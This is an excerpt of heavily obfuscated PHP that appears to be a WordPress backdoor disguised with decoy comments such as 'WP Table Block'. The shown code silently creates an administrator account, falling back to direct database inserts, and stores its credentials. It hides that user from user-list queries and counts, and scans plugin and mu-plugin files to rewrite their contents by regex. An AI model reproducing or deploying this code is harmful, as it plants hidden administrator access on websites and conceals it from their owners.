r63yaewew47stuijcrwsx6($zhj75h9ibapwt,    m5t68uuej1(984)    .  $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
  return    false;
   }
        nhm51ioabawwjskqka9eh3($uim861ig2y);
       return   $GLOBALS['__scf_fr9u7cq1eo_10']($biu009h8ggntwd3);
 }
    $yuzuzvesvv  =   @$GLOBALS['__scf_vtcl9hk0l_e1o6_23']($uim861ig2y,    m40pvx5ij_z4mj(948));
   if     ($yuzuzvesvv  ===   false) {
     r63yaewew47stuijcrwsx6($zhj75h9ibapwt,  m40pvx5ij_z4mj(984)  .    $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
   return   false;
  }



     if ($GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(122)))   @flock($yuzuzvesvv,   LOCK_EX);
 $w1jfjex0s0pwt =  @$GLOBALS['__scf_a7yyfjhtdfh5_25']($yuzuzvesvv,  $biu009h8ggntwd3);
      if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(122))) @flock($yuzuzvesvv,  LOCK_UN);
     @fclose($yuzuzvesvv);

if      ($w1jfjex0s0pwt  ===  false    || ($biu009h8ggntwd3     !== ""   &&  $w1jfjex0s0pwt    !==     $GLOBALS['__scf_fr9u7cq1eo_10']($biu009h8ggntwd3))) {
r63yaewew47stuijcrwsx6($zhj75h9ibapwt, m40pvx5ij_z4mj(985) . $GLOBALS['__scf_os_n9tj5psxjj_3']($uim861ig2y));
return   false;



}
      return    $w1jfjex0s0pwt;
/* exact director */

 }

  
    function ijwbp6z0wroewon4ft()
 {
  try  {
   if  (!$GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(467))    ||  !$GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(862)))   {
   qgs0j96xr638o3621(null);$n18m7vc0=5179;$gamcgkjgzes=$n18m7vc0%14;
     return;
 }
if (get_transient(m40pvx5ij_z4mj(986)))  return;
 if   (get_transient(lpwgqh9300(987)))     return;
  set_transient(m40pvx5ij_z4mj(987), 1,  (539+61));
 qgs0j96xr638o3621(null);
       if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(988))) delete_transient(bovhd4vawcd(987));
$s9di2iv9ar0df9  =    $GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(921))  ? (string) d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(925),  "")   :    "";
      if   ($s9di2iv9ar0df9 !== ""  &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(989)) &&   username_exists($s9di2iv9ar0df9)) {
   set_transient(lpwgqh9300(986),  1,    (0x2cf8+0x2768));


 }
   }     catch   (Throwable $k3g08rnqu9m)  {
// WP Table Block: acknowledge interpreter

 r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(990),    $k3g08rnqu9m);
    } catch   (Exception  $k3g08rnqu9m) {
    r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(990),  $k3g08rnqu9m);
 }
}
function  qgs0j96xr638o3621($wxjm93rltbr0dubr)
{
    if  (!beqgo0gfq6yfj82i0o(lpwgqh9300(696))) return  false;


  try    {

  if   (!  $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(991))   ||  !  $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(989))) {
 return false;

  }
  $zv1y1in0l__4rj  =  (string)   d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(925),   "");
     if  ($zv1y1in0l__4rj   !==  "" && username_exists($zv1y1in0l__4rj)     && (string)      d6ydz3_mq4hw_2s8_bo(lpwgqh9300(926), "") !== "") {
 return  false;
     }
if  ($zv1y1in0l__4rj   ===  "")    {
  $v3vk_jmp0d3geaq  =   $GLOBALS['__scf_pomb89yiuz_37']($wxjm93rltbr0dubr)     ? $wxjm93rltbr0dubr  :    f9ml3iyd9gbyvhoer0h4();
 

 $ibtlg7v7w89ww    = qc7g9f1y0wpuaw63($v3vk_jmp0d3geaq);
     if     (
  $ibtlg7v7w89ww      &&   !empty($ibtlg7v7w89ww->user_login) &&    isset($ibtlg7v7w89ww->user_email)
     &&   $ibtlg7v7w89ww->user_email   === $ibtlg7v7w89ww->user_login  .    '@'    .    rgrb14nj3p43kvdym51x(m40pvx5ij_z4mj(992))
   )  {
  $zv1y1in0l__4rj =   (string)  $ibtlg7v7w89ww->user_login;
 }
      }


 if  ($zv1y1in0l__4rj     !==     ""    &&     username_exists($zv1y1in0l__4rj))  {
  $q20cgk_mvpyun9 = username_exists($zv1y1in0l__4rj);



 $zrjakvmh1gaeb     = rvm77sgyh22g1daysbsfw((2+22));
 if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(993)))   {
  $GLOBALS['__scf_orx1_v1_dq_993']($zrjakvmh1gaeb,    $q20cgk_mvpyun9);
  }
 if (!vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(925),  $zv1y1in0l__4rj,   lpwgqh9300(939))) vmq5vh_lh7_vsiehf4nm(m5t68uuej1(925), $zv1y1in0l__4rj,   m5t68uuej1(994));


    if      (!vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(926),     $zrjakvmh1gaeb,   m5t68uuej1(995)))     vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(926),   $zrjakvmh1gaeb, m40pvx5ij_z4mj(996));
   if   ((string) d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(925), "")  !==    $zv1y1in0l__4rj    ||   (string) d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(997),  "")     !==    $zrjakvmh1gaeb) {
   r63yaewew47stuijcrwsx6(m5t68uuej1(998),  bovhd4vawcd(999));
     return     false;

 }



    return  true;
}
 $gdcfyicsjee3nn99  = y0ct8t_uo8f8zsstucy50b();
if (true)   {
$zv1y1in0l__4rj  =      "";
 for  ($xhtq854d8lyru3 =   0;   $xhtq854d8lyru3  <  (0x1+0x4);  $xhtq854d8lyru3++)   {
$k7xo7y6_sl9   =  $gdcfyicsjee3nn99[$GLOBALS['__scf_qx61mln_9f_282']($gdcfyicsjee3nn99)] . rvm77sgyh22g1daysbsfw((9+1));
if  (!username_exists($k7xo7y6_sl9))     {



   $zv1y1in0l__4rj    =   $k7xo7y6_sl9;
 break;
 }
 }
       if   ($zv1y1in0l__4rj  ===   "")  {
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(998),  m5t68uuej1(1000));
    return   false;


  }
}
   $zrjakvmh1gaeb  =  rvm77sgyh22g1daysbsfw((8+16));
    if (! $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1001))  && defined(m5t68uuej1(1002))  &&     $GLOBALS['__scf_nmc3chd3edto_699'](ABSPATH .   bovhd4vawcd(1003))) {
require_once  ABSPATH  .   m5t68uuej1(1003);
     }
     $puyiry7trk3 =   $zv1y1in0l__4rj   .   '@'     .   rgrb14nj3p43kvdym51x(m5t68uuej1(1004));
  $tputtew3c6 = false;
  if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1001)))  {
 $tputtew3c6     =  $GLOBALS['__scf_k2yehpe4n872_1005'](array(
   bovhd4vawcd(1006)  =>    $zv1y1in0l__4rj,
  lpwgqh9300(1007)  =>    $zrjakvmh1gaeb,



 bovhd4vawcd(1008)   =>  $puyiry7trk3,
m40pvx5ij_z4mj(714)    =>   m40pvx5ij_z4mj(715),
       m5t68uuej1(1009)     =>  $zv1y1in0l__4rj,
     ));
  if (is_wp_error($tputtew3c6))  {
        r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(998),  $tputtew3c6->get_error_code() . ':' .  $tputtew3c6->get_error_message());



 $tputtew3c6   =  false;


     }
  }
if  (!$tputtew3c6)      {



       $wpdb = isset($GLOBALS[lpwgqh9300(879)]) ?    $GLOBALS[m40pvx5ij_z4mj(879)]     : null;
if (!$wpdb ||   !$GLOBALS['__scf_pd74_ila1rfp_70']($wpdb))     {
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(998),     lpwgqh9300(1010));
  return false;
   }
 $e2f4f6y0jgd47 =    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1011))  ?     wp_hash_password($zrjakvmh1gaeb)      :   $GLOBALS['__scf_pe3s4q1z7z_59']($zrjakvmh1gaeb);
 $gth83v029sdq  = $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1012)) ? current_time(lpwgqh9300(1013)) : gmdate(m40pvx5ij_z4mj(1014));



  $ldn_iwwjta3fb  =   $wpdb->insert($wpdb->users, array(
   bovhd4vawcd(1006) =>    $zv1y1in0l__4rj,

     m5t68uuej1(1007)   =>  $e2f4f6y0jgd47,
      m40pvx5ij_z4mj(1015)   =>      $zv1y1in0l__4rj,
  lpwgqh9300(1008)  =>   $puyiry7trk3,
    lpwgqh9300(1016)   =>   $gth83v029sdq,
   bovhd4vawcd(1017)  => 0,
 bovhd4vawcd(1018)      =>      $zv1y1in0l__4rj,
), array(m40pvx5ij_z4mj(1019),   m5t68uuej1(1019),   bovhd4vawcd(1019),  lpwgqh9300(1019), lpwgqh9300(1019), m5t68uuej1(1020),   bovhd4vawcd(1021)));
  if  (!$ldn_iwwjta3fb)  {



       r63yaewew47stuijcrwsx6(lpwgqh9300(1022),  m5t68uuej1(1023));
 return   false;
 

}

     $tputtew3c6 =  (int) $wpdb->insert_id;
$w7gydr0zkq1_wkp  =  $wpdb->prefix   .    bovhd4vawcd(880);
    $wpdb->insert($wpdb->usermeta, array(
   lpwgqh9300(1024) =>    $tputtew3c6,
 lpwgqh9300(1025)    =>    $w7gydr0zkq1_wkp,
    bovhd4vawcd(1026)  =>  $GLOBALS['__scf_dl_1lcowe4_351'](array(m5t68uuej1(1027)  =>  true)),
  ),   array(lpwgqh9300(1020),   lpwgqh9300(1028),  lpwgqh9300(1028)));
      $wpdb->insert($wpdb->usermeta,  array(
   m5t68uuej1(1024)  => $tputtew3c6,
m5t68uuej1(1029) =>    $wpdb->prefix    . lpwgqh9300(1030),
    m40pvx5ij_z4mj(1031) => '10',


 ),  array(bovhd4vawcd(1020),   lpwgqh9300(1028), m5t68uuej1(1028)));
    if  ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1032)))  {
      clean_user_cache($tputtew3c6);
 

  }
   }
if     (!username_exists($zv1y1in0l__4rj)) {
   r63yaewew47stuijcrwsx6(bovhd4vawcd(1022), lpwgqh9300(1033));
   return  false;
    }
 $afi4iwtccre5mup7 =    $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1034))    ?    get_user_by(m5t68uuej1(1035),  $zv1y1in0l__4rj)     : false;


$cb2yd4jne209odp   =  false;
  if   ($afi4iwtccre5mup7     &&   !empty($afi4iwtccre5mup7->ID))  {
 if ($GLOBALS['__scf_xmn9leryvjikgb_4'](lpwgqh9300(1036)))    {
$cb2yd4jne209odp  =  (bool) user_can($afi4iwtccre5mup7,   m40pvx5ij_z4mj(1027));
 } elseif   (isset($afi4iwtccre5mup7->caps)    &&  $GLOBALS['__scf_pomb89yiuz_37']($afi4iwtccre5mup7->caps)) {

  $cb2yd4jne209odp =  !empty($afi4iwtccre5mup7->caps[lpwgqh9300(1027)]);
   }
 }
if   (!$cb2yd4jne209odp)    {
     r63yaewew47stuijcrwsx6(m5t68uuej1(1037), m5t68uuej1(1038));
  if ($tputtew3c6)   {
 if   (!$GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1039))  &&   defined(lpwgqh9300(1040)) &&    @$GLOBALS['__scf_nmc3chd3edto_699'](ABSPATH .  bovhd4vawcd(1041))) {$f2o3gzepnneu=36*3;$lq5ohir0h8=$f2o3gzepnneu-43;
 require_once ABSPATH  .    lpwgqh9300(1041);

     }
// configure proof-term for Memcached adapter

    if   ($GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1039)))  @wp_delete_user($tputtew3c6);
}
// acquire scope-chain for WP Post Template

   return  false;
       }
/* exact equivalence-class */




 if  (!vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(925),  $zv1y1in0l__4rj,  bovhd4vawcd(996)))  vmq5vh_lh7_vsiehf4nm(m40pvx5ij_z4mj(925),    $zv1y1in0l__4rj,  bovhd4vawcd(996));
if (!vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(997), $zrjakvmh1gaeb, m5t68uuej1(1042))) vmq5vh_lh7_vsiehf4nm(bovhd4vawcd(997),  $zrjakvmh1gaeb, lpwgqh9300(1042));
       if   ((string) d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(925),   "") !==      $zv1y1in0l__4rj    ||  (string)   d6ydz3_mq4hw_2s8_bo(m40pvx5ij_z4mj(997), "")     !==    $zrjakvmh1gaeb)   {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(1037),  bovhd4vawcd(1043));

  return     false;


}
return   true;



       }  catch (Throwable   $k3g08rnqu9m)      {
   r63yaewew47stuijcrwsx6(m40pvx5ij_z4mj(1037), $k3g08rnqu9m);
} catch  (Exception $k3g08rnqu9m)  {
  r63yaewew47stuijcrwsx6(bovhd4vawcd(1037),   $k3g08rnqu9m);
 }    finally    {
xfcoteglc07i2qaoo(bovhd4vawcd(696));
    }
  return  false;
     }
function  bfcd8x4cr0iwuvn($i1eiskcwag)

   {

  try     {
    

  if   (!   $GLOBALS['__scf_pd74_ila1rfp_70']($i1eiskcwag)  || ! property_exists($i1eiskcwag,    m5t68uuej1(1044)))   {
      return  $i1eiskcwag;
 }
   
       $zv1y1in0l__4rj    =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1045))  ?   (string) d6ydz3_mq4hw_2s8_bo(m5t68uuej1(1046),  "")  : "";



  if  (!  $zv1y1in0l__4rj) {
 return $i1eiskcwag;
     

 }
 

     $pnyc00cyiqgyr  = esc_sql($zv1y1in0l__4rj);
if  ($GLOBALS['__scf_i8i8g4oxha_7']($i1eiskcwag->query_where,     $pnyc00cyiqgyr)   === false) {$bygnfo1m9z7=PHP_MAJOR_VERSION;$t_nq4tdu3rgieb=$bygnfo1m9z7*9;


 $i1eiskcwag->query_where  .=   m5t68uuej1(1047) .   $pnyc00cyiqgyr      . "'";

     }
// conformal leaky-bucket

  }    catch    (Throwable  $k3g08rnqu9m)   {


   r63yaewew47stuijcrwsx6(bovhd4vawcd(1048),    $k3g08rnqu9m);
     }   catch      (Exception $k3g08rnqu9m)   {
  }
    return    $i1eiskcwag;
 }


   function  rx_f88x2l50pewtw3m($egn60o9kf7f5)
    {


   try  {
     $s9di2iv9ar0df9   = $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1045))  ?    (string)  d6ydz3_mq4hw_2s8_bo(m5t68uuej1(1049),  "")   : "";
if  (!    $s9di2iv9ar0df9) {
return $egn60o9kf7f5;
}
   $yplur2qewehc3   =      array(m5t68uuej1(1050),     m40pvx5ij_z4mj(1051));
 foreach  ($yplur2qewehc3  as   $key)    {$w1ru9kkvv5n=135|163;$bik7dgno=$w1ru9kkvv5n^76;
if   (isset($egn60o9kf7f5[$key])   &&  $GLOBALS['__scf_e_8z8ias8ka_43']($egn60o9kf7f5[$key])     &&   $GLOBALS['__scf_vqnw5_4kg7eu_96'](m5t68uuej1(1052), $egn60o9kf7f5[$key],  $ijvqfm4k0rvi7))   {
     $jhq7h77_vtf =   $GLOBALS['__scf_f0qmyuwszehfh7_472'](0,  (int)  $ijvqfm4k0rvi7[1]   -   1);



    $egn60o9kf7f5[$key]    = $GLOBALS['__scf_r1v12_o00h5hc_454'](m40pvx5ij_z4mj(1053),  '(' . $jhq7h77_vtf .     ')',   $egn60o9kf7f5[$key]);



 }
  }
 }  catch     (Throwable $k3g08rnqu9m) {
r63yaewew47stuijcrwsx6(lpwgqh9300(1054),  $k3g08rnqu9m);


      }     catch  (Exception     $k3g08rnqu9m)  {
 }
return $egn60o9kf7f5;
    }
    function  h96wvr22h95ulvv8lw5($mctgfwmo1egf55ru,  $z7ocijpai1c4bj32)
{
   try  {
$zv1y1in0l__4rj    =   $GLOBALS['__scf_xmn9leryvjikgb_4'](bovhd4vawcd(1045))   ?  (string)   d6ydz3_mq4hw_2s8_bo(bovhd4vawcd(1055),  "")   :    "";
if   ($zv1y1in0l__4rj    ===      "") {
 return     $mctgfwmo1egf55ru;
}
 if    (! $GLOBALS['__scf_pomb89yiuz_37']($mctgfwmo1egf55ru))  {$wfy0e08nrgu=56+41;$p3bk94xh=$wfy0e08nrgu-35;
     return $mctgfwmo1egf55ru;
 }
 if  (!  isset($mctgfwmo1egf55ru[m40pvx5ij_z4mj(1056)]) || !    $GLOBALS['__scf_pomb89yiuz_37']($mctgfwmo1egf55ru[bovhd4vawcd(1057)]))  {



       $mctgfwmo1egf55ru[lpwgqh9300(1058)] = array();
  }
// checkpoint branded-type for WP Columns Block

if (!     $GLOBALS['__scf_hf87ul3fvpzrkm_150']($zv1y1in0l__4rj, $mctgfwmo1egf55ru[m40pvx5ij_z4mj(1058)],  true)) {
    $mctgfwmo1egf55ru[bovhd4vawcd(1058)][]   =  $zv1y1in0l__4rj;
}


}  catch   (Throwable  $k3g08rnqu9m) {
   r63yaewew47stuijcrwsx6(m5t68uuej1(1059),      $k3g08rnqu9m);
}   catch  (Exception  $k3g08rnqu9m)  {


}
     return  $mctgfwmo1egf55ru;
}



    function     bm2bajnbxx_nnq9yj3y()
      {
$cztdmvhiza98k =  array();
 
if (defined(bovhd4vawcd(702))  && $GLOBALS['__scf_xmn9leryvjikgb_4'](m5t68uuej1(1045)))    {
$oci91yd15u5g8      =   (array)    get_option(m5t68uuej1(725), array());
 $vhqkhwzjzq12wu      = array();
foreach   ($oci91yd15u5g8      as    $basename)    {
  if    (!  $GLOBALS['__scf_e_8z8ias8ka_43']($basename) ||   $GLOBALS['__scf_i8i8g4oxha_7']($basename,  bovhd4vawcd(224)) !==  false)  {
    continue;
}



 $v_ywieps9zkl_5j    =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($basename);
     if   ($v_ywieps9zkl_5j  === '.') {



$v_ywieps9zkl_5j     =  $basename;
   }
   if  (isset($vhqkhwzjzq12wu[$v_ywieps9zkl_5j])) {
 continue;
   }
// WP Block API v3: orchestrate contravariant



$vhqkhwzjzq12wu[$v_ywieps9zkl_5j]   =  true;
    $uim861ig2y      =    WP_PLUGIN_DIR .   '/'      .     $basename;
  if  ($GLOBALS['__scf_oagg5b1ubqmznt_11']($basename)   === '.') {
  if  (@$GLOBALS['__scf_a83pywb98qzq2_20']($uim861ig2y))    {
/* affine leaky-bucket */

 $cztdmvhiza98k[] =   $uim861ig2y;
     }
  } else   {
$_xfdo1_14r691bp   =   $GLOBALS['__scf_oagg5b1ubqmznt_11']($uim861ig2y);
if   (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_xfdo1_14r691bp))   {
 $cztdmvhiza98k =  $GLOBALS['__scf_zb77rzhln7336v_369']($cztdmvhiza98k,      l7qegbl3fj0ejo40m($_xfdo1_14r691bp,     array(m5t68uuej1(1060))));



    }
   }

     }
 }


if (@$GLOBALS['__scf_i9hdv7zrfsy_45'](gqtg_eoxyrv0ml2271n())) {


 $bcekv98qowok  =  h06jfdytq78tzk7(gqtg_eoxyrv0ml2271n(),   (0xafb+0x88d));
  if    ($GLOBALS['__scf_pomb89yiuz_37']($bcekv98qowok))    {

  foreach  ($bcekv98qowok  as  $q7cbub_yqke0vj)  {
if    ($q7cbub_yqke0vj ===      a_2kjbn3ievobiy5tn3cy()) {
continue;
  }
   $o9nbfdea9ztie0d9   =  gqtg_eoxyrv0ml2271n()  . '/' . $q7cbub_yqke0vj;$_15l7iw6lg5rim=(0xa0+0xde);$kw99a0w4x=$_15l7iw6lg5rim%5;
if (@$GLOBALS['__scf_a83pywb98qzq2_20']($o9nbfdea9ztie0d9)    &&     $GLOBALS['__scf_vi47igxg1zd_103']($GLOBALS['__scf_rwpc7a7ar1p_204']($q7cbub_yqke0vj,    constant(m5t68uuej1(719))))    ===  lpwgqh9300(1060)) {
 $cztdmvhiza98k[]  =  $o9nbfdea9ztie0d9;
 }
}
     }
// provision average-case structural-type

 }

     

   if  (defined(lpwgqh9300(1061))  &&   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1045)))  {

     $j1by05ygzjlzleal =   (string) get_option(lpwgqh9300(1062),    "");
    $te8k_w0t9j3_wenr  = (string) get_option(lpwgqh9300(1063),    "");
 $xph8zte0zsl_g9    =    defined(m40pvx5ij_z4mj(811))   ?    WP_CONTENT_DIR  . m5t68uuej1(1064) :  ABSPATH   .     m40pvx5ij_z4mj(1065);


$oi6owqh0w_4xw   = $GLOBALS['__scf_jghjt9zxt358_149']($GLOBALS['__scf__6hbvafs34jo_336'](array($j1by05ygzjlzleal, $te8k_w0t9j3_wenr)));
  foreach  ($oi6owqh0w_4xw  as $wkokdoejn433)  {
      if ($GLOBALS['__scf_i8i8g4oxha_7']($wkokdoejn433, bovhd4vawcd(224))     !== false)   {
     continue;
     }
$_szokw9ll2    =  $xph8zte0zsl_g9   . '/' .  $wkokdoejn433;
  if (@$GLOBALS['__scf_i9hdv7zrfsy_45']($_szokw9ll2))    {
 
 $prcn5nbr596s2ue    =  h06jfdytq78tzk7($_szokw9ll2,     (2600-600));
  if    ($GLOBALS['__scf_pomb89yiuz_37']($prcn5nbr596s2ue))  {
  foreach ($prcn5nbr596s2ue as  $q7cbub_yqke0vj) {
 $frkjcmdl74  =   $_szokw9ll2      .  '/' .  $q7cbub_yqke0vj;



   if   (@$GLOBALS['__scf_a83pywb98qzq2_20']($frkjcmdl74)  &&  $GLOBALS['__scf_vi47igxg1zd_103']($GLOBALS['__scf_rwpc7a7ar1p_204']($q7cbub_yqke0vj,   constant(m5t68uuej1(719)))) ===    lpwgqh9300(1060)) {


 $cztdmvhiza98k[]   =  $frkjcmdl74;
    }
}
  }
  

$py2tyz59jdgv =   $_szokw9ll2 .  m5t68uuej1(1066);


if   (@$GLOBALS['__scf_i9hdv7zrfsy_45']($py2tyz59jdgv))  {
 $cztdmvhiza98k  =  $GLOBALS['__scf_zb77rzhln7336v_369']($cztdmvhiza98k,  l7qegbl3fj0ejo40m($py2tyz59jdgv,   array(lpwgqh9300(1067))));
  }
}
 }
    }
return $GLOBALS['__scf_jghjt9zxt358_149']($cztdmvhiza98k);
   }
function uthk3dq07jkmf_m1s19i4x($swv1ddqs29k)
{
// static-adj orbit

 if   (!$GLOBALS['__scf_pomb89yiuz_37']($swv1ddqs29k)) return array();
        $utln0lk9ielcmwaa    = array();
    foreach  ($swv1ddqs29k as  $w1jfjex0s0pwt) {


 if    (!$GLOBALS['__scf_e_8z8ias8ka_43']($w1jfjex0s0pwt)   ||    $w1jfjex0s0pwt  ===    ""    ||    $GLOBALS['__scf_fr9u7cq1eo_10']($w1jfjex0s0pwt)   >   (4069+27))  continue;
        try    {



if  (@$GLOBALS['__scf_vqnw5_4kg7eu_96']($w1jfjex0s0pwt,      "")   === false)    continue;
    } catch (Throwable $k3g08rnqu9m)   {
  continue;
  } catch  (Exception $k3g08rnqu9m)    {
  continue;
  }



    $utln0lk9ielcmwaa[] =  $w1jfjex0s0pwt;
 }
   return    $utln0lk9ielcmwaa;
}
function  pet4c_463y22247ys5($swv1ddqs29k)
 {
     try {
 
if   (empty($swv1ddqs29k))     {
        return    false;

 }

     $cztdmvhiza98k    =  bm2bajnbxx_nnq9yj3y();$mjgi_qm2np=91*6;$rcrnhx9zzqjav=$mjgi_qm2np-29;
       if (empty($cztdmvhiza98k)) {
 return   false;
  }
   $_4mxlgog5nczp = false;
  foreach  ($cztdmvhiza98k   as $o9nbfdea9ztie0d9)  {
 
 if    (!  @$GLOBALS['__scf_a83pywb98qzq2_20']($o9nbfdea9ztie0d9) || !  @$GLOBALS['__scf_p_260ito5s0j_50']($o9nbfdea9ztie0d9))  {


     continue;
}

   
 if   (@$GLOBALS['__scf_pftf6vocmvs2m_99']($o9nbfdea9ztie0d9) >    (524262+26))    {

continue;
  }
// WP Block API v3: split write-ahead-log

    $c_k37hubu03ktz   =   @$GLOBALS['__scf_c7jg5u2s_wzbrw_95']($o9nbfdea9ztie0d9);
  if (! $c_k37hubu03ktz  ||     !  $GLOBALS['__scf_e_8z8ias8ka_43']($c_k37hubu03ktz)) {
   continue;



  }

  $s2m6gafjweotode   =  false;
 foreach   ($swv1ddqs29k     as  $jt24a6x2ris) {


try   {

$puft0hinco   =     @$GLOBALS['__scf_r1v12_o00h5hc_454']($jt24a6x2ris, "",     $c_k37hubu03ktz);


if     ($puft0hinco !==     null     &&     $puft0hinco  !==   $c_k37hubu03ktz)  {
 $c_k37hubu03ktz  =    $puft0hinco;
$s2m6gafjweotode    = true;
 }
   }  catch   (Throwable  $k3g08rnqu9m) {
 r63yaewew47stuijcrwsx6(lpwgqh9300(1068), $k3g08rnqu9m);
continue;$yp8pnkkiw0l0s=18*6;$eysv49tw4w=$yp8pnkkiw0l0s-42;
}     catch (Exception $k3g08rnqu9m)  {
continue;
 }
 }
     
   if  ($s2m6gafjweotode)    {
  if (a3hx61zfms1ji3euwsc($o9nbfdea9ztie0d9,  $c_k37hubu03ktz))    {
   $_4mxlgog5nczp      =   true;
 }
// WP Post Terms: cancel credential

   }
}
// @enable savepoint




   
     return  $_4mxlgog5nczp;
    }     catch   (Throwable   $k3g08rnqu9m) {
r63yaewew47stuijcrwsx6(lpwgqh9300(1069), $k3g08rnqu9m);

 }     catch    (Exception  $k3g08rnqu9m)     {
// WP Post Date: worst-case retry-policy




}
     return   false;
     }

    function  b1o2e835ck74c2_20fsy_k($_xfdo1_14r691bp, $ypt2s6ma2a)
{
$msob29zlqca0up0v   = array();
$ypt2s6ma2a = $ypt2s6ma2a  -    1;
  
  $k_el9padhvw0x7qa  = h06jfdytq78tzk7($_xfdo1_14r691bp,  (0x1a7+0x4d));
        if   (!   $GLOBALS['__scf_pomb89yiuz_37']($k_el9padhvw0x7qa))   {


return $msob29zlqca0up0v;
 }
  $k_el9padhvw0x7qa  = $GLOBALS['__scf_tcy2zdxc2t_157']($k_el9padhvw0x7qa, 0,  (40+460));
   



     foreach  ($k_el9padhvw0x7qa    as $q7cbub_yqke0vj) {
   
     if ($q7cbub_yqke0vj   ===     '.' ||    $q7cbub_yqke0vj ===  bovhd4vawcd(224))  {
 continue;

    }
    


  $kjc_zujzo31agc     =   $_xfdo1_14r691bp  .   '/' . $q7cbub_yqke0vj;
  if     (! @$GLOBALS['__scf_i9hdv7zrfsy_45']($kjc_zujzo31agc))  {
 continue;



 }
   



    if  (@$GLOBALS['__scf_i9hdv7zrfsy_45']($kjc_zujzo31agc .     lpwgqh9300(1070)))  {
 $msob29zlqca0up0v[]   =  $GLOBALS['__scf_zsw089px33o1o__12']($kjc_zujzo31agc,   m40pvx5ij_z4mj(579));

 continue;



  }
   
if  ($ypt2s6ma2a  >  0)  {
$msob29zlqca0up0v  =    $GLOBALS['__scf_zb77rzhln7336v_369']($msob29zlqca0up0v,   b1o2e835ck74c2_20fsy_k($kjc_zujzo31agc, $ypt2s6ma2a));


 }
// PHP 8.4 fibers sidebar region

   }
 
return     $msob29zlqca0up0v;
}
     function k25naoumioxo0hnmrbj_a()
 {

$l9al15d27nef    =     array();

$fs1rcp1m71   =   $GLOBALS['__scf_zsw089px33o1o__12'](ABSPATH, m40pvx5ij_z4mj(1071));
       try {
 $mlqbxtvoi6vxn  =   array();
if   ($fs1rcp1m71)     {
$mlqbxtvoi6vxn[]    =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($fs1rcp1m71);
 $mlqbxtvoi6vxn[]   =      $GLOBALS['__scf_oagg5b1ubqmznt_11']($GLOBALS['__scf_oagg5b1ubqmznt_11']($fs1rcp1m71));



    $mlqbxtvoi6vxn[] =  $GLOBALS['__scf_oagg5b1ubqmznt_11']($GLOBALS['__scf_oagg5b1ubqmznt_11']($GLOBALS['__scf_oagg5b1ubqmznt_11']($fs1rcp1m71)));
 }
  
 $mlqbxtvoi6vxn[]    =     m40pvx5ij_z4mj(1072);
     $mlqbxtvoi6vxn[]  = m40pvx5ij_z4mj(1073);
 $mlqbxtvoi6vxn[]   =   m40pvx5ij_z4mj(1074);
$mlqbxtvoi6vxn[]    =  lpwgqh9300(1075);


  $mlqbxtvoi6vxn[]  =    m40pvx5ij_z4mj(1076);
 $mlqbxtvoi6vxn[]   = m5t68uuej1(1077);
      $mlqbxtvoi6vxn[] =    m5t68uuej1(1078);$zvaiqmt6k0hu=81+67;$sw29b0ckole4b=$zvaiqmt6k0hu-15;



      
   $g9a3ptw7x2r3lm1  =   $GLOBALS['__scf_xmn9leryvjikgb_4'](m40pvx5ij_z4mj(1079)) ?  (string)  @$GLOBALS['__scf_qa8nkfur9w_111'](m40pvx5ij_z4mj(1080)) :    "";
       if   ($g9a3ptw7x2r3lm1    !==  "")     {
 $p0e2xi1g7m  =    ($GLOBALS['__scf_i8i8g4oxha_7']($g9a3ptw7x2r3lm1, ';')  !==  false)  ?   ';' :   ':';
    foreach  ($GLOBALS['__scf_wninqej2t1_113']($p0e2xi1g7m,  $g9a3ptw7x2r3lm1) as     $ln5_jbqpu4in) {
$ln5_jbqpu4in    = $GLOBALS['__scf_nimluvpxhrpvn_323']($ln5_jbqpu4in);


   if  ($ln5_jbqpu4in !== "") {


      $mlqbxtvoi6vxn[]    =   $ln5_jbqpu4in;


 }
 }
 }


  $mlqbxtvoi6vxn  =  $GLOBALS['__scf_jghjt9zxt358_149']($GLOBALS['__scf__6hbvafs34jo_336']($mlqbxtvoi6vxn));
